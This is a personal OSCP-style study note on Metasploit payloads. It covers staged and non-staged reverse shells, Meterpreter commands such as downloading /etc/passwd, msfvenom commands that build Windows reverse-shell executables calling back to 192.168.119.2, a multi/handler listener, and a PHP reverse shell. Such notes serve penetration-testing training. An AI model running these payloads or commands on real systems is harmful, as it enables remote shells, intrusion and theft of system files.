---
aliases:
  - Metasploit Payloads
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - metasploit
  - payload
author: Mehdi N Tehrani
creat_date: 2024-01-04
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Payloads
#payload #payloads
- Get all payloads
```msfconsole
show payloads
```
## staged
#staged
First a smaller payload is sent, a second one is retrieved after to get a shell.
*Less stable*, but *smaller*.
example:
```msfconsole
payload/linux/x64/shell/reverse_tcp
```
## non-staged
#non_staged
The whole payload in one go.
*More stable*, but *larger*.
example:
```msfconsole
payload/linux/x64/shell_reverse_tcp
```

## meterpreter
#meterpreter 
A multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is *encrypted by default*. Meterpreter offers capabilities that are especially useful in the post-exploitation phase and exists for various operating systems such as *Windows*, *Linux*, *macOS*, *Android*, and more.

```meterpreter
help
sysinfo
getuid
shell
download /etc/passwd
upload /home/kali/file /tmp/
ls /tmp
```

- commands reflecting the local machine
```meterpreter
lpwd
lcd /home/kali
lcat /home/kali/file
```

### meterpreter reverse https
#reverse_http #reverse_https
by default if not set, meterpreter uses `/`
using LURI, we can use the same listener for multiple channels based on the path used
```msfconsole
set luri path1
```

# Executable Payloads
#executable #msfvenom 
## msfvenom
[msfvenom - how to use](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- list payloads #list
```sh
msfvenom -l payloads

msfvenom -l payloads --platform <windows/linux> --arch <x64/x86>
```
- Build payload #build
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe 
```

## meterpreter Listener / Handler
#multi_handler
https://www.rapid7.com/db/modules/exploit/multi/handler/
```msfconsole
use multi/handler
set payload windows/x64/shell/reverse_tcp

```


## PHP reverse shell
#php 
```sh
msfvenom -p php/reverse_php -o <file>.php lhost=<lhost> lport=<lport>
```
